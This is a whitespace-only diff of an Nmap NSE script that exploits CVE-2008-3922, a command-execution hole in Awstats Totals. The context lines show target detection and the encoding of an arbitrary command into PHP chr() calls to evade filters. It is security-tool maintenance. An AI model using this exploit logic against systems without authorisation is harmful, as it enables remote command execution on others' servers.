@@ -17,7 +17,7 @@ Common paths for Awstats Total:
 * <code>/awstats/awstatstotals.php</code>
 
 References:
-* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922 
+* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922
 * http://www.exploit-db.com/exploits/17324/
 ]]
 
@@ -89,7 +89,7 @@ action = function(host, port)
   local output = {}
   local uri = stdnse.get_script_args("http-awstatstotals-exec.uri") or DEFAULT_URI
   local cmd = stdnse.get_script_args("http-awstatstotals-exec.cmd") or DEFAULT_CMD
-  local out = stdnse.get_script_args("http-awstatstotals-exec.outfile") 
+  local out = stdnse.get_script_args("http-awstatstotals-exec.outfile")
 
   --check for awstats signature
   local awstats_check = check_installation(host, port, uri)
@@ -97,8 +97,8 @@ action = function(host, port)
     stdnse.print_debug(1, "%s:This does not look like Awstats Totals. Quitting.", SCRIPT_NAME)
     return
   end
-  
-  --Encode payload using PHP's chr() 
+
+  --Encode payload using PHP's chr()
   local encoded_payload = ""
   cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
   if string.sub(encoded_payload, #encoded_payload) == "." then
